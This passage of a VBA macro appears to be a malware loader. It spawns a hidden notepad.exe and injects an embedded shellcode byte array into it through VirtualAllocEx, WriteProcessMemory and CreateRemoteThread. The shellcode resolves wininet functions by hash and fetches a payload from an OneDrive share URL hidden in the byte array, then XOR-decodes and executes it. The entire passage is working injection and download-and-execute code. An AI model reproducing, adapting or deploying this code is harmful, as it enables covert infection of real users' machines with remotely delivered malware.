 Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Dkhnszol As LongPtr, ByRef Wwgtgy As Any, ByVal Hrkmuos As LongPtr) As LongPtr
 Private Declare PtrSafe Function CreateRemoteThread Lib "kernel32" (ByVal hProcess As LongPtr, lpThreadAttributes As Any, ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, lpParameter As Any, ByVal dwCreationFlags As LongPtr, lpThreadID As Long) As Long
 Private Declare PtrSafe Function GlobalAlloc Lib "kernel32" (ByVal wFlags As LongPtr, ByVal dwBytes As LongPtr) As LongPtr
 Private Declare PtrSafe Function GlobalFree Lib "kernel32" (ByVal hMem As LongPtr) As LongPtr
 Private Declare PtrSafe Function CreateProcessA Lib "kernel32" (ByVal lpApplicationName As Long, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As LongPtr
#Else
 Private Declare Function VirtualAllocEx Lib "kernel32.dll" (ByVal hProcess As Long, lpAddress As Any, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
 Private Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, ByVal lpBaseAddress As Any, ByVal lpBuffer As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
 Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
 Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessID As Long) As Long
 Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Dkhnszol As Long, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As Long
 Private Declare Function CreateRemoteThread Lib "kernel32" (ByVal hProcess As Long, lpThreadAttributes As Any, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Any, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long
 Private Declare PtrSafe Function GlobalAlloc Lib "kernel32" (ByVal wFlags As Long, ByVal dwBytes As LongPtr) As LongPtr
 Private Declare PtrSafe Function GlobalFree Lib "kernel32" (ByVal hMem As LongPtr) As LongPtr
 Private Declare Function CreateProcessA Lib "kernel32" (ByVal lpApplicationName As Long, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long
#End If
Private Type STARTUPINFO
cb As Long
lpReserved As String
lpDesktop As String
lpTitle As String
dwX As Long
dwY As Long
dwXSize As Long
dwYSize As Long
dwXCountChars As Long
dwYCountChars As Long
dwFillAttribute As Long
dwFlags As Long
wShowWindow As Integer
cbReserved2 As Integer
lpReserved2 As Long
hStdInput As Long
hStdOutput As Long
hStdError As Long
End Type
Private Type PROCESS_INFORMATION
hProcess As LongPtr
hThread As LongPtr
dwProcessID As Long
dwThreadID As Long
End Type
Public hTargetProcHandle As LongPtr
Public dwCodeLen As Long
Public hThread As Long
Public TID As Long
Public shellAddr As LongPtr
Private Const GMEM_MOVEABLE = &H2
Private Const GMEM_ZEROINIT = &H40
Private Const GHND = (GMEM_MOVEABLE Or GMEM_ZEROINIT)
Sub main()
 Const STARTF_USESHOWWINDOW = &H1
 Const SW_SHOW = 5
 Const SW_Hide = 0
 Const PROCESS_ALL_ACCESS = &H1F0FFF
 Const MEM_COMMIT = &H1000
 Const MEM_RESERVE = &H2000
 Const MEM_RESET = &H8000
 Const PAGE_EXECUTE_READWRITE = &H40
 Dim proc As PROCESS_INFORMATION
 Dim PID As Long
 Dim src_str As Variant
 src_str = Array(&H55, &H8B, &HEC, &H83, &HEC, &H2C, &H50, &HE8, &H4, &H0, &H0, &H0, &H85, &HC0, &H75, &H7, &H8B, &H4, &H24, &H89, &H45, &HEC, &HC3, &H58, &HB9, &H4C, &H77, &H26, &H7, &HE8, &HCE, &H0, &H0, &H0, &H89, &H45, &HF0, &HB9, &H58, &HA4, &H53, &HE5, &HE8, &HC1, &H0, &H0, &H0, &H89, &H45, &HF4, &H6A, &H40, &H68, &H0, &H10, &H0, &H0, &H68, &H0, &H0, &HA0, &H0, &H6A, &H0,&HFF, &H55, &HF4, &H89, &H45, &HFC, &HC7, &H45, &HD4, &H77, &H69, &H6E, &H69, &HC7, &H45, &HD8, &H6E, &H65, &H74, &H2E, &HC7, &H45, &HDC, &H64, &H6C, &H6C, &H0, &H83, &H65, &HE0, &H0, &H8D, &H45, &HD4, &H50, &HFF, &H55, &HF0, &H8B, &H45, &HEC, &H5, &H91, &H12, &HA2, &H0, &H2D, &H0, &H10, &HA2, &H0, &H83, &HE8, &HC, &H89, &H45, &HE8, &H8B, &H55, &HFC, &H8B, &H4D, &HE8, &HE8,&H61, &H1, &H0, &H0, &H89, &H45, &HF8, &H83, &H7D, &HF8, &H0, &H74, &HC, &H8B, &H4D, &HFC, &HE8, &H31, &H0, &H0, &H0, &H85, &HC0, &H75, &H2, &HEB, &H15, &H8B, &H55, &HF8, &H8B, &H4D, &HFC, &HE8, &HC, &H0, &H0, &H0, &H8B, &H45, &HFC, &H40, &H89, &H45, &HE4, &HFF, &H55, &HE4, &HC9, &HC3, &H56, &H33, &HF6, &H46, &H3B, &HD6, &H76, &HA, &H8A, &H1, &H30, &H4, &HE, &H46,&H3B, &HF2, &H72, &HF6, &H5E, &HC3, &H80, &H39, &H3C, &H75, &H21, &H80, &H79, &H1, &H3F, &H75, &H1B, &H80, &H79, &H2, &H78, &H75, &H15, &H80, &H79, &H3, &H6D, &H75, &HF, &H80, &H79, &H4, &H6C, &H75, &H9, &H80, &H79, &H5, &H20, &H75, &H3, &H33, &HC0, &HC3, &H33, &HC0, &H40, &HC3, &H55, &H8B, &HEC, &H83, &HEC, &H1C, &H64, &HA1, &H30, &H0, &H0, &H0, &H53, &H56, &H57, &H8B,&H40, &HC, &H89, &H4D, &HEC, &H8B, &H78, &HC, &HE9, &HA7, &H0, &H0, &H0, &H8B, &H47, &H30, &H33, &HF6, &H8B, &H5F, &H2C, &H8B, &H3F, &H89, &H45, &HF8, &H8B, &H42, &H3C, &H89, &H7D, &HF4, &H8B, &H44, &H10, &H78, &H89, &H45, &HF0, &H85, &HC0, &HF, &H84, &H85, &H0, &H0, &H0, &HC1, &HEB, &H10, &H33, &HC9, &H85, &HDB, &H74, &H2D, &H8B, &H7D, &HF8, &HF, &HBE, &H14, &HF, &HC1,&HCE, &HD, &H80, &H3C, &HF, &H61, &H89, &H55, &HF8, &H7C, &H9, &H8B, &HC2, &H83, &HC0, &HE0, &H3, &HF0, &HEB, &H3, &H3, &H75, &HF8, &H41, &H3B, &HCB, &H72, &HDF, &H8B, &H55, &HFC, &H8B, &H7D, &HF4, &H8B, &H45, &HF0, &H8B, &H4C, &H10, &H18, &H33, &HDB, &H8B, &H44, &H10, &H20, &H3, &HC2, &H89, &H4D, &HE8, &H85, &HC9, &H74, &H3C, &H8B, &H8, &H33, &HFF, &H3, &HCA, &H83, &HC0,&H4, &H89, &H4D, &HF8, &H8B, &HD1, &H89, &H45, &HE4, &H8A, &HA, &HC1, &HCF, &HD, &HF, &HBE, &HC1, &H3, &HF8, &H42, &H84, &HC9, &H75, &HF1, &H8B, &H55, &HFC, &H89, &H7D, &HF8, &H8B, &H45, &HF8, &H8B, &H7D, &HF4, &H3, &HC6, &H3B, &H45, &HEC, &H74, &H1E, &H8B, &H45, &HE4, &H43, &H3B, &H5D, &HE8, &H72, &HC4, &H8B, &H57, &H18, &H89, &H55, &HFC, &H85, &HD2, &HF, &H85, &H4B, &HFF,&HFF, &HFF, &H33, &HC0, &H5F, &H5E, &H5B, &HC9, &HC3, &H8B, &H75, &HF0, &H8B, &H44, &H16, &H24, &H8D, &H4, &H58, &HF, &HB7, &HC, &H10, &H8B, &H44, &H16, &H1C, &H8D, &H4, &H88, &H8B, &H4, &H10, &H3, &HC2, &HEB, &HDF, &H55, &H8B, &HEC, &H83, &HEC, &H24, &H53, &H56, &H57, &H89, &H4D, &HF8, &H33, &HFF, &HB9, &H3A, &H56, &H79, &HA7, &H89, &H55, &HF0, &H89, &H7D, &HFC, &HC7, &H45,&HDC, &H4D, &H79, &H41, &H67, &HC7, &H45, &HE0, &H65, &H6E, &H74, &H0, &HE8, &HDF, &HFE, &HFF, &HFF, &HB9, &H77, &H87, &H7A, &HF0, &H8B, &HF0, &HE8, &HD3, &HFE, &HFF, &HFF, &HB9, &H12, &H96, &H89, &HE2, &H89, &H45, &HF4, &HE8, &HC6, &HFE, &HFF, &HFF, &HB9, &HD3, &H6B, &H6E, &HD4, &H89, &H45, &HEC, &HE8, &HB9, &HFE, &HFF, &HFF, &H57, &H57, &H57, &H8B, &HD8, &H8D, &H45, &HDC, &H57,&H50, &H89, &H5D, &HE8, &HFF, &HD6, &H89, &H45, &HE4, &H85, &HC0, &H74, &H3F, &H57, &H68, &H0, &H0, &H0, &H84, &H57, &H57, &HFF, &H75, &HF8, &H50, &HFF, &H55, &HF4, &H8B, &HF0, &H85, &HF6, &H74, &H23, &H8B, &H5D, &HF0, &H8D, &H45, &HFC, &H50, &H68, &HD0, &H7, &H0, &H0, &H8D, &H4, &H1F, &H50, &H56, &HFF, &H55, &HEC, &H3, &H7D, &HFC, &H83, &H7D, &HFC, &H0, &H75, &HE6, &H8B,&H5D, &HE8, &H56, &HFF, &HD3, &HFF, &H75, &HE4, &HFF, &HD3, &H8B, &HC7, &H5F, &H5E, &H5B, &HC9, &HC3, &H68, &H74, &H74, &H70, &H73, &H3A, &H2F, &H2F, &H61, &H70, &H69, &H2E, &H6F, &H6E, &H65, &H64, &H72, &H69, &H76, &H65, &H2E, &H63, &H6F, &H6D, &H2F, &H76, &H31, &H2E, &H30, &H2F, &H73, &H68, &H61, &H72, &H65, &H73, &H2F, &H75, &H21, &H61, &H48, &H52, &H30, &H63, &H48, &H4D, &H36,&H4C, &H79, &H38, &H78, &H5A, &H48, &H4A, &H32, &H4C, &H6D, &H31, &H7A, &H4C, &H33, &H55, &H76, &H63, &H79, &H46, &H42, &H61, &H6C, &H56, &H79, &H5A, &H44, &H6C, &H6F, &H64, &H55, &H31, &H77, &H55, &H57, &H4E, &H6A, &H54, &H47, &H74, &H34, &H62, &H58, &H68, &H42, &H56, &H30, &H70, &H6A, &H51, &H55, &H31, &H6A, &H61, &H32, &H4D, &H5F, &H5A, &H54, &H31, &H6D, &H55, &H6E, &H63, &H34,&H56, &H48, &H67, &H2F, &H72, &H6F, &H6F, &H74, &H2F, &H63, &H6F, &H6E, &H74, &H65, &H6E, &H74, &H0)
Dim start As STARTUPINFO
 Dim ReturnValue As LongPtr
 Dim ret As Long
 Dim hThreadID As Long
 start.cb = Len(start)
 start.dwFlags = STARTF_USESHOWWINDOW
 start.wShowWindow = SW_Hide
 Dim hGlobalMemory As LongPtr, i As Long
 Dim bValue As Long
 Dim bIs64Bit As Boolean
 #If Win64 Then
  Dim FSO As Object
  Set FSO = CreateObject("Scripting.FileSystemObject")
  Dim windowsDir As String
  windowsDir = FSO.GetSpecialFolder(0)
  windowsDir = windowsDir & "\SysWOW64\notepad.exe"
  ReturnValue = CreateProcessA(0, windowsDir, 0, 0, False, 0, 0, 0, start, proc)
 #Else
  ReturnValue = CreateProcessA(0, "notepad.exe", 0, 0, False, 0, 0, 0, start, proc)
 #End If
 PID = proc.dwProcessID
 If PID Then hTargetProcHandle = OpenProcess(PROCESS_ALL_ACCESS, False, PID) Else Exit Sub
 dwCodeLen = &H800
 shellAddr = VirtualAllocEx(hTargetProcHandle, ByVal 0, dwCodeLen, &H3000, PAGE_EXECUTE_READWRITE)
 hGlobalMemory = GlobalAlloc(GHND, UBound(src_str)) 
 For i = LBound(src_str) To UBound(src_str)
  bValue = src_str(i)
  RtlMoveMemory hGlobalMemory + i, bValue, 1
 Next i
 Dim resultWriteProcess
 resultWriteProcess = WriteProcessMemory(hTargetProcHandle, shellAddr, hGlobalMemory, UBound(src_str) + 1, ret)
 hThread = CreateRemoteThread(hTargetProcHandle, ByVal 0, 0, shellAddr, 0, 0, 0)
End Sub
